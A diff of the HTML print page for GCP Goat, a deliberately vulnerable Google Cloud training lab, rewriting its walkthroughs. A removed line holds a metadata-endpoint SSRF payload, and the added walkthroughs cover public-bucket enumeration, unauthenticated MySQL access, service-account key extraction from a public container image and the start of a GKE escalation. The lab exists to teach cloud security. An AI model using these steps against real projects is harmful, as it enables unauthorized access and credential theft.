@@ -4,39 +4,25 @@
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
         <title>GCP Goat</title>
-        
         <meta name="robots" content="noindex" />
-        
-        
 
 
         <!-- Custom HTML head -->
         
-
-
-        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
         <meta name="description" content="GCP-Goat is intentionally vulnerable GCP environment to learn and practice GCP Security">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff" />
 
-        
         <link rel="icon" href="favicon.svg">
-        
-        
         <link rel="shortcut icon" href="favicon.png">
-        
         <link rel="stylesheet" href="css/variables.css">
         <link rel="stylesheet" href="css/general.css">
         <link rel="stylesheet" href="css/chrome.css">
-        
         <link rel="stylesheet" href="css/print.css" media="print">
-        
 
         <!-- Fonts -->
         <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
-        
         <link rel="stylesheet" href="fonts/fonts.css">
-        
 
         <!-- Highlight.js Stylesheets -->
         <link rel="stylesheet" href="highlight.css">
@@ -44,19 +30,18 @@
         <link rel="stylesheet" href="ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
-        
 
-        
     </head>
     <body>
+    <div id="body-container">
         <!-- Provide site root to javascript -->
-        <script type="text/javascript">
+        <script>
             var path_to_root = "";
             var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
         </script>
 
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
-        <script type="text/javascript">
+        <script>
             try {
                 var theme = localStorage.getItem('mdbook-theme');
                 var sidebar = localStorage.getItem('mdbook-sidebar');
@@ -72,7 +57,7 @@
         </script>
 
         <!-- Set the theme before any content is loaded, prevents flash -->
-        <script type="text/javascript">
+        <script>
             var theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
@@ -84,12 +69,14 @@
         </script>
 
         <!-- Hide / unhide sidebar before it is displayed -->
-        <script type="text/javascript">
+        <script>
             var html = document.querySelector('html');
-            var sidebar = 'hidden';
+            var sidebar = null;
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
             }
             html.classList.remove('sidebar-visible');
             html.classList.add("sidebar-" + sidebar);
@@ -97,17 +84,38 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="about.html"><strong aria-hidden="true">2.</strong> About GCP Goat</a></li><li class="chapter-item expanded "><a href="Getting-Started.html"><strong aria-hidden="true">3.</strong> Getting Started</a></li><li class="chapter-item expanded "><a href="attacking-compute.html"><strong aria-hidden="true">4.</strong> Attacking Compute Engine</a></li><li class="chapter-item expanded "><a href="attacking-sql.html"><strong aria-hidden="true">5.</strong> Attacking Sql Instance</a></li><li class="chapter-item expanded "><a href="attacking-gke.html"><strong aria-hidden="true">6.</strong> Attacking GKE</a></li><li class="chapter-item expanded "><a href="attacking-gcs.html"><strong aria-hidden="true">7.</strong> Attacking GCS</a></li><li class="chapter-item expanded "><a href="privilege-escalation.html"><strong aria-hidden="true">8.</strong> Privilege Escalation</a></li><li class="chapter-item expanded "><a href="privilege-escalation-compute.html"><strong aria-hidden="true">9.</strong> Privilege Escalation in Compute Engine</a></li><li class="chapter-item expanded "><a href="wrap-up.html"><strong aria-hidden="true">10.</strong> Wrapping up</a></li><li class="chapter-item expanded "><a href="contributing.html"><strong aria-hidden="true">11.</strong> Contributing to the GCP Goat</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="about.html"><strong aria-hidden="true">2.</strong> About GCP Goat</a></li><li class="chapter-item expanded "><a href="Getting-Started.html"><strong aria-hidden="true">3.</strong> Getting Started</a></li><li class="chapter-item expanded "><a href="attacking-gcs.html"><strong aria-hidden="true">4.</strong> Attacking GCS</a></li><li class="chapter-item expanded "><a href="attacking-sql.html"><strong aria-hidden="true">5.</strong> Attacking Sql Instance</a></li><li class="chapter-item expanded "><a href="attacking-artifact-registry.html"><strong aria-hidden="true">6.</strong> Attacking Artifact Registry</a></li><li class="chapter-item expanded "><a href="attacking-gke.html"><strong aria-hidden="true">7.</strong> Attacking GKE</a></li><li class="chapter-item expanded "><a href="attacking-app-engine.html"><strong aria-hidden="true">8.</strong> Attacking App Engine</a></li><li class="chapter-item expanded "><a href="privilege-escalation-sa.html"><strong aria-hidden="true">9.</strong> Privilege Escalation Using Service account impersonation</a></li><li class="chapter-item expanded "><a href="wrap-up.html"><strong aria-hidden="true">10.</strong> Wrapping up</a></li><li class="chapter-item expanded "><a href="contributing.html"><strong aria-hidden="true">11.</strong> Contributing to the GCP Goat</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
 
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
         <div id="page-wrapper" class="page-wrapper">
 
             <div class="page">
-                
-                <div id="menu-bar-hover-placeholder"></div>
-                <div id="menu-bar" class="menu-bar sticky bordered">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
                         <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                             <i class="fa fa-bars"></i>
@@ -116,35 +124,30 @@
                             <i class="fa fa-paint-brush"></i>
                         </button>
                         <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
-                        
                         <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                             <i class="fa fa-search"></i>
                         </button>
-                        
                     </div>
 
                     <h1 class="menu-title">GCP Goat</h1>
 
                     <div class="right-buttons">
-                        
                         <a href="print.html" title="Print this book" aria-label="Print this book">
                             <i id="print-button" class="fa fa-print"></i>
                         </a>
-                        
-                        
+
                     </div>
                 </div>
 
-                
                 <div id="search-wrapper" class="hidden">
                     <form id="searchbar-outer" class="searchbar-outer">
-                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                     </form>
                     <div id="searchresults-outer" class="searchresults-outer hidden">
                         <div id="searchresults-header" class="searchresults-header"></div>
@@ -152,10 +155,9 @@
                         </ul>
                     </div>
                 </div>
-                
 
                 <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
-                <script type="text/javascript">
+                <script>
                     document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                     document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                     Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
@@ -166,7 +168,7 @@
                 <div id="content" class="content">
                     <main>
                         <img src="images/gcp-goat.png" alt="drawing" width="500"/>
-<h2 id="gcp-goat"><a class="header" href="#gcp-goat">GCP GOAT</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="gcp-goat"><a class="header" href="#gcp-goat">GCP GOAT</a></h2>
 <p>GCP-Goat is intentionally vulnerable GCP environment to learn and practice GCP Security</p>
 <h2 id="-disclaimer"><a class="header" href="#-disclaimer">⚠️ Disclaimer</a></h2>
 <blockquote>
@@ -177,8 +179,11 @@
 </blockquote>
 <h2 id="about-the-author"><a class="header" href="#about-the-author">About the author</a></h2>
 <p>GCP goat was created by <a href="https://www.joshuajebaraj.com/">Joshua Jebaraj</a></p>
-<p><strong>Joshua Jebaraj</strong> is Security Enthusiast. He is an active member of many open-source communities like Null, Ansible and Hashicorp He frequently speaks at null Chennai chapter and OWASP Vit Chennai. He also Spoken at conferences like <strong>Owasp-Seasides</strong> and <strong>Bsides-Delhi</strong> . When away from the screen he can be found at watching movies and making memes</p>
-<h2 id="getting-started"><a class="header" href="#getting-started">Getting Started</a></h2>
+<p>Joshua Jebaraj is a cloud native security researcher and his primary area of interest resides around GCP and Kubernetes Security.He had also Spoken at conferences like BlackHat,Hack in the box,Defcon,Owasp-Seasides,Bsides-Delhi and Eko-party When away from the screen he can be found watching movies and making memes</p>
+<blockquote>
+<p>Note this is the new version of GCP Goat and if you want to check the old version of GCP Goat you can find it <a href="TBD">here</a></p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="getting-started"><a class="header" href="#getting-started">Getting Started</a></h2>
 <p>This tutorial assumes that you have Google Cloud Account with Billing Enabled in order to create the resources need for the Setup</p>
 <p>If you have don't have the Google Cloud Account Create one by following the given link <a href="https://console.cloud.google.com/getting-started">Get Started with Google Cloud Platform</a></p>
 <p>Go to the <a href="https://console.cloud.google.com">Google-Console</a></p>
@@ -187,269 +192,429 @@
 <p>Create the new Project by Clicking New Project </p>
 <p><img src="images/setup-2.png" alt="setup-2" /></p>
 <p>Enter a Valid name and click Create</p>
-<p>Go to the <a href="https://console.cloud.google.com/apis">API Dashboard</a></p>
-<p>Click on the <code>ENABLE API AND SERVICES</code></p>
-<p><img src="images/setup-3.png" alt="setup-3" /></p>
-<p>Search for <code>Compute Engine API</code> and click Enable</p>
-<p><img src="images/setup-4.png" alt="setup-4" /></p>
-<p>Repeat the Same for the <code>Kubernetes Engine API</code> and for the <code>Cloud SQL Admin API</code></p>
-<p>Once you have done Go to the GCloud Shell by clicking the <code>terminal</code> icon in top right corner</p>
-<p><img src="images/setup-5.png" alt="setup-5" /></p>
-<p>Once you are inside the <code>Shell</code>  make sure the shell points to the current project </p>
-<p><img src="./images/2021-08-07-23-36-35.png" alt="" /></p>
-<p>clone the repository by  typing the following command in the <code>GCLOUD SHELL</code></p>
-<pre><code class="language-bash">git clone https://github.com/JOSHUAJEBARAJ/GCP-Goat.git
+<blockquote>
+<p>Please note the project ID for future reference
+Once it is done click on the below link to clone the repository</p>
+</blockquote>
+<p><a href="https://ssh.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/JOSHUAJEBARAJ/GCP-GOAT">Clone the Repository</a></p>
+<p>Tick the <code>Trust Project</code> and click on <code>CONFIRM</code> , It will take few seconds to clone the repository and open the cloud shell</p>
+<p>Next export the project id using the below command</p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
 </code></pre>
-<p>Move into the <code>Scenarios</code> folder by typing the following command in the <code>GCLOUD SHELL</code></p>
-<pre><code class="language-bash">cd GCP-Goat/scenarios/
+<p>Next configure the project id using the below command</p>
+<pre><code class="language-bash">gcloud config set project $PROJECT_ID
 </code></pre>
-<h2 id="attacking-google-compute-engine"><a class="header" href="#attacking-google-compute-engine">Attacking Google Compute Engine</a></h2>
+<p>Next enable the necessary services using the below command</p>
+<pre><code class="language-bash">gcloud services enable cloudresourcemanager.googleapis.com
+</code></pre>
+<pre><code class="language-bash">gcloud services enable iam.googleapis.com
+</code></pre>
+<pre><code class="language-bash">gcloud services enable compute.googleapis.com
+</code></pre>
+<p>Once it is done navigate into the scenarios directory by executing the below command</p>
+<pre><code class="language-bash">cd scenarios
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-google-cloud-storage"><a class="header" href="#attacking-google-cloud-storage">Attacking Google Cloud Storage</a></h2>
 <p>In order to start the scenario go to the <code>scenario-1</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
 <pre><code class="language-bash">cd scenario-1
 </code></pre>
-<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">./create-scenario-1.sh
+<p>Go into the <a href="https://canarytokens.org/generate#">canary-token</a> and generate the dummy aws creds and copy the value </p>
+<p>Now move into the <code>juice-shop</code> folder and create the new file called <code>aws-creds.txt</code> and paste the copied value in the file </p>
+<pre><code class="language-bash">cd juice-shop
+</code></pre>
+<p>Once it is done move back into the <code>scenario-1</code> folder and zip the <code>juice-shop</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd ..
+</code></pre>
+<pre><code class="language-bash">zip -r juice-shop.zip juice-shop/
+</code></pre>
+<p>Export the <code>PROJECT_ID</code> variable by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
+</code></pre>
+<p>Now deploy the infrastructure by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">terraform init
+</code></pre>
+<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID -var unique-name=&lt;BUCKET_NAME&gt;
 </code></pre>
 <blockquote>
-<p>Note: It takes some time in  to install and Start the  docker container so be patient 🧘‍♂️</p>
+<p>Note the <code>BUCKET_NAME</code> should be unique, if you get the error while deploying the infrastructure change the <code>BUCKET_NAME</code> and try again</p>
 </blockquote>
-<h2 id="scenario-info"><a class="header" href="#scenario-info">Scenario Info</a></h2>
-<p>SSRF is the most common Vulnerability found in the cloud Environment .</p>
-<p>According to <code>OWASP</code>
-<strong>In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources</strong></p>
-<p>In order to learn more about <code>SSRF</code> in Google Cloud I highly recommend to check out <a href="https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/">Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments</a>  by <a href="https://about.gitlab.com/company/team/#init_string">Chris Moberly</a></p>
-<p>In  our Scenario, we assume Our application was Suffering from <code>SSRF</code> vulnerability</p>
-<p>Go to the IP address shown in the output of the executed script</p>
-<p>On Visiting the URL using the browser The application should look like below Screenshot</p>
-<p><img src="images/2021-07-31-11-22-45.png" alt="Original" /></p>
+<h3 id="scenario-info"><a class="header" href="#scenario-info">Scenario info</a></h3>
+<p>Public-Facing Google Bucket is the most common vulnerability in the <code>GCP</code> environment Users often create the bucket with public access in order to use the data stored in the bucket to be used by external application ,Sometimes this leads leakage of sensitive information</p>
+<p>In this scenario we are going to see how to find the public bucket using the TBD name and how to access the data stored in the bucket </p>
 <h3 id="solution"><a class="header" href="#solution">Solution</a></h3>
-<p>Now enter the payload <code>http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=text</code> in the URL field and <code>Metadata-Flavor: Google</code> in the header field and Click <code>CHECK STATUS</code> Button</p>
-<p><img src="images/2021-07-31-11-24-20.png" alt="" /></p>
-<p>Now you could able to see all the <code>meta-data</code> of the <code>Compute-Engine</code></p>
+<p>In order to find the public bucket we are going to use the tool called <a href="https://github.com/JOSHUAJEBARAJ/gcp-enum">gcp-enum</a></p>
+<p>Install the <code>gcp-enum</code> by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">git clone https://github.com/JOSHUAJEBARAJ/gcp-enum
+</code></pre>
+<p>Next navigate to the <code>gcp-enum</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd gcp-enum
+</code></pre>
+<p>Now run the <code>gcp-enum</code> by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">go run main.go -k &lt;unique-name&gt; -file short-wordlist -c 10
+</code></pre>
 <blockquote>
-<p>Note In recent version Compute Engine SSRF is only possible if you able to pass the <code>headers</code> as <code>Metadata-Flavor: Google</code> </p>
+<p>Replace the <code>&lt;unique-name&gt;</code> with the bucket name which you have used while deploying the infrastructure</p>
 </blockquote>
+<p>You will see one valid bucket name in the output which end with <code>-backup</code></p>
+<blockquote>
+<p>Note if you find the other bucket name with other than <code>-backup</code> , please ignore it and don't try to access it as it may belong to other users and it may lead to legal issues</p>
+</blockquote>
+<p>Now try to access the bucket by typing the below url in the browser</p>
+<pre><code class="language-bash">http://&lt;unique-name&gt;-backup.storage.googleapis.com/
+</code></pre>
+<p>For example if the bucket name is <code>gcp-goat-123</code> then the url will be </p>
+<pre><code class="language-bash">http://gcp-goat-123-backup.storage.googleapis.com/
+</code></pre>
+<p>Now on acessing the url you will find the <code>juice-shop.zip</code> file</p>
+<p>Let's download the file by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">wget http://&lt;unique-name&gt;-backup.storage.googleapis.com/juice-shop.zip
+</code></pre>
+<p>Next unzip the file by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">unzip juice-shop.zip
+</code></pre>
+<p>Now move into the <code>juice-shop</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd juice-shop
+</code></pre>
+<p>Now you will find the <code>aws-creds.txt</code> file in the folder</p>
 <h3 id="clean-up"><a class="header" href="#clean-up">Clean up</a></h3>
 <p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">./delete-scenario-1.sh
+<pre><code class="language-bash">cd scenario-1
+</code></pre>
+<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID -var unique-name=&lt;unique-name&gt; 
 </code></pre>
 <p>Move into the previous folder by typing the below command in the <code>GCLOUD Shell</code></p>
 <pre><code class="language-bash">cd ..
 </code></pre>
-<h2 id="attacking-sql-instance"><a class="header" href="#attacking-sql-instance">Attacking SQL Instance</a></h2>
-<p>In order to start the scenario go to the <code>scenario-2</code> folder by typing the below  command in the <code>GCLOUD Shell</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-sql-instance"><a class="header" href="#attacking-sql-instance">Attacking SQL Instance</a></h2>
+<p>In order to start the scenario go to the <code>scenario-2</code> folder by typing the below  command in the shell</p>
 <pre><code class="language-bash">cd scenario-2
 </code></pre>
-<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code> the script expects the user to give the name </p>
-<blockquote>
-<p>Note if you try to deploy the same scenario  create with the different name because reusing the same name will create conflicts</p>
-</blockquote>
-<pre><code class="language-bash">./create-scenario-2.sh &lt;SQL INSTANCE NAME&gt;
+<p>Export the project ID by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
 </code></pre>
 <blockquote>
-<p>Note : It takes too long  to create the <code>instance</code> so be patient 🧘‍♂️</p>
+<p>replace the <code>project-id</code> with your project ID</p>
 </blockquote>
+<p>Next configure the <code>gcloud</code> to use the project by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud config set project $PROJECT_ID
+</code></pre>
+<p>Next enable the <code>Cloud SQL Admin API</code> by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud services enable sqladmin.googleapis.com
+</code></pre>
+<p>Next initialize the terraform by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform init
+</code></pre>
+<p>Next apply the terraform by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID
+</code></pre>
+<blockquote>
+<p>Note This will take some time to create the resources be patient 🧘 </p>
+</blockquote>
+<p>Once it is done note the ip-address of the <code>SQL Instance</code> from the terraform output</p>
 <h3 id="scenario-info-1"><a class="header" href="#scenario-info-1">Scenario info</a></h3>
 <p>Google SQL allows developers to set up the database without any hassle by default the database can be accessed only within the authorized network but during debugging the database sometimes the user may open the database to the public for easy debugging In this Scenario the attacker gets to know to about the public-facing SQL Instance</p>
 <h3 id="solution-1"><a class="header" href="#solution-1">Solution</a></h3>
+<p>First we are going to perform some <code>reconnaissance</code> on the <code>Instance</code> using nmap, in order to do that we need to first install <code>nmap</code> in the <code>GCLOUD Shell</code> by typing the below command in the shell</p>
+<pre><code class="language-bash">sudo apt-get install nmap -y
+</code></pre>
+<p>Next run the nmap scan by typing the below command in the shell</p>
+<pre><code class="language-bash">nmap -Pn &lt;SQL INSTANCE IP&gt;
+</code></pre>
 <p>Running <code>Nmap</code> Scan on the IP reveals that <code>MySQL</code> service  was running on the given instance</p>
-<p><img src="images/scenario-2a.png" alt="scenario-2a" /></p>
-<p>In order to get remote access to the instance <code>MySQL client</code> has to be Installed</p>
-<p>We can easily Install the <code>MYSQL-client</code> by following the <a href="https://dev.mysql.com/doc/refman/8.0/en/installing.html">offical docs</a></p>
-<p>Now type the below command in the terminal  to connect to the remote SQL instance running in the Google Cloud</p>
 <pre><code>mysql -u root -h &lt;ip&gt;
 </code></pre>
-<p><img src="images/scenario-2b.png" alt="scenario-2b" /></p>
 <blockquote>
 <p>Note This scenario assumes there was no authentication for the  database , but in real world may  find some weak credentials </p>
 </blockquote>
+<p>Enter <code>\q</code> to exit the database</p>
 <h3 id="clean-up-1"><a class="header" href="#clean-up-1">Clean up</a></h3>
 <p>To clean up the <code>Scenario</code> type the below  command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">./delete-scenario-2.sh &lt;SQL INSTANCE NAME&gt;
+<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID
 </code></pre>
-<p>Move into the previous folder by typing the below command in the <code>GCLOUD Shell</code></p>
-<pre><code class="language-bash">cd ..
-</code></pre>
-<h2 id="attacking-google-kubernetes-engine"><a class="header" href="#attacking-google-kubernetes-engine">Attacking Google Kubernetes Engine</a></h2>
-<p>Inorder to start the scenario go to the <code>scenario-3</code> folder by typing the below command in the <code>GCLOUD SHELL</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-artifact-registry"><a class="header" href="#attacking-artifact-registry">Attacking Artifact Registry</a></h2>
+<p>In order to start the scenario go to the <code>scenario-3</code> folder by typing the below  command in the shell</p>
 <pre><code class="language-bash">cd scenario-3
 </code></pre>
-<p>Start the Scenario by typing the below command in the <code>GCLOUD SHELL</code></p>
-<pre><code class="language-bash">./create-scenario-3.sh
+<p>Export the project ID by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
+</code></pre>
+<blockquote>
+<p>replace the <code>project-id</code> with your project ID</p>
+</blockquote>
+<p>Next configure the <code>gcloud</code> to use the project by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud config set project $PROJECT_ID
+</code></pre>
+<p>Next enable the <code>Artifact Registry</code> api by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud services enable artifactregistry.googleapis.com
+</code></pre>
+<p>Next initialize the terraform by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform init
+</code></pre>
+<p>Next apply the terraform by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID
+</code></pre>
+<p>Next output the service account key by typing the below command in the shell </p>
+<pre><code class="language-bash">terraform output -raw sa-key &gt; creds.json
+</code></pre>
+<p>Next login into the <code>artifact registry</code> by typing the below command in the shell </p>
+<pre><code class="language-bash">gcloud auth configure-docker us-central1-docker.pkg.dev
+</code></pre>
+<p>Next build and push the image using the below command </p>
+<pre><code class="language-bash">docker build -t us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest .
+</code></pre>
+<pre><code class="language-bash">docker push us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest
+</code></pre>
+<h2 id="scenario-info-2"><a class="header" href="#scenario-info-2">Scenario info</a></h2>
+<p>According to the google docs </p>
+<blockquote>
+<p>Artifact Registry provides a single location for managing private packages and Docker container images.</p>
+</blockquote>
+<p>Even though the <code>Artifact Registry</code> is private by default, sometimes users make the <code>Artifact Registry</code> public in order to use the packages and docker images in the external application, this leads to the leakage of sensitive information</p>
+<p>In this scenario, we are going to see download the docker image from the <code>Artifact Registry</code> and extract the sensitive information from the docker image</p>
+<h2 id="solution-2"><a class="header" href="#solution-2">Solution</a></h2>
+<blockquote>
+<p>Note: This scenario assumes that we have somehow able to find the project name and repo name</p>
+</blockquote>
+<p>On your local machine , try to pull the docker image by typing the below command in the shell </p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
+</code></pre>
+<pre><code class="language-bash">docker pull us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest
+</code></pre>
+<p>Once the image is pulled, try to extract the sensitive information from the image by typing the below command in the shell </p>
+<pre><code class="language-bash">docker run --rm -it us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest sh
+</code></pre>
+<p>Next try to list the files in the <code>/</code> directory by typing the below command in the shell </p>
+<pre><code class="language-bash">ls 
+</code></pre>
+<p>On executing the above command you will find the file called <code>creds.json</code> which contains the service account key</p>
+<p>Now using the service account key we can access the <code>GCP</code> resources</p>
+<blockquote>
+<p>Note for security reasons , the service account does not have any permission to access the resources, but in the real world, the service account will have the permission to access the resources</p>
+</blockquote>
+<h2 id="clean-up-2"><a class="header" href="#clean-up-2">Clean up</a></h2>
+<p>In order to clean up the infrastructure, type the below command in the shell </p>
+<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-google-kubernetes-engine"><a class="header" href="#attacking-google-kubernetes-engine">Attacking Google Kubernetes Engine</a></h2>
+<p>Inorder to start the scenario go to the <code>scenario-4</code> folder by typing the below command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">cd scenario-4
+</code></pre>
+<blockquote>
+<p>Note this scenarios requires you to run the both terraform and bash script </p>
+</blockquote>
+<p>First export the project id using the below command </p>
+<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
+</code></pre>
+<pre><code class="language-bash">export PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format=&quot;value(projectNumber)&quot;)
+</code></pre>
+<p>Next deploy the k8s cluster using the below command</p>
+<pre><code class="language-bash">gcloud services enable container.googleapis.com
+</code></pre>
+<pre><code class="language-bash">gcloud container clusters create gcp-goat-cluster \
+    --workload-pool=$PROJECT_ID.svc.id.goog --machine-type=n1-standard-1 \
+    --num-nodes=2 --zone &quot;asia-east1-a&quot;
+</code></pre>
+<p>Now configure the <code>kubectl</code> to use the cluster by typing the below command</p>
+<pre><code class="language-bash">gcloud  container clusters get-credentials gcp-goat-cluster --zone &quot;asia-east1-a&quot;
 </code></pre>
 <blockquote>
 <p>Note : It takes too long in order to setup the <code>kubernetes cluster</code> so be patient 🧘‍♂️</p>
 </blockquote>
-<h3 id="scenario-info-2"><a class="header" href="#scenario-info-2">Scenario info</a></h3>
-<p>GKE allows the user to set up the Kubernetes environment without much hassle ,By default the application running in the pod are not exposed outside world. To access the service outside the cluster there are 3 type of <code>services</code> can be use</p>
-<ol>
-<li>NodePort</li>
-<li>Loadbalancer</li>
-<li>Ingress</li>
-</ol>
-<p>Sometimes the application exposed via <code>Nodeport</code> may contains the sensitive information or services which meant to be used internally without authentication </p>
-<h3 id="solution-2"><a class="header" href="#solution-2">Solution</a></h3>
-<p>Type the below command  the in the <code>GCLOUD SHELL</code> to find the IP of nodes</p>
+<p>Once it is done create the namespace and kubernetes service account by typing the below command</p>
+<pre><code class="language-bash">kubectl create namespace test
+</code></pre>
+<pre><code class="language-bash">kubectl create serviceaccount k8s-sa \
+    --namespace test
+</code></pre>
+<p>Next deploy the necessary resources by typing the below command</p>
+<pre><code class="language-bash">terraform init
+</code></pre>
+<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID -var project_number=$PROJECT_NUMBER
+</code></pre>
+<p>Once it is done update the annotations of the <code>k8s-sa</code> service account by typing the below command</p>
+<pre><code class="language-bash">kubectl annotate serviceaccount \
+    --namespace test k8s-sa \
+    iam.gke.io/gcp-service-account=gcp-goat@$PROJECT_ID.iam.gserviceaccount.com
+</code></pre>
+<p>Deploy the application using the below command </p>
+<pre><code class="language-bash">kubectl apply -f app.yaml -n test 
+</code></pre>
+<h3 id="scenario-info-3"><a class="header" href="#scenario-info-3">Scenario info</a></h3>
+<p>According to the Official docs </p>
+<blockquote>
+<p>Workload Identity allows a Kubernetes service account in your GKE cluster to act as an IAM service account. Pods that use the configured Kubernetes service account automatically authenticate as the IAM service account when accessing Google Cloud APIs. Using Workload Identity allows you to assign distinct, fine-grained identities and authorization for each application in your cluster.</p>
+</blockquote>
+<p>In this scenario, we will deploy a vulnerable application to a Kubernetes cluster that has Workload Identity enabled. We will then exploit a vulnerability in the application and get the shell in the container, from there we will use the service account associated with the pod to perform the privilege escalation </p>
+<p>The application we were deployed is exposed via the node port on the port <code>30003</code></p>
+<p>First find the ip address of the node in order to access the application via nodeport by typing the below command</p>
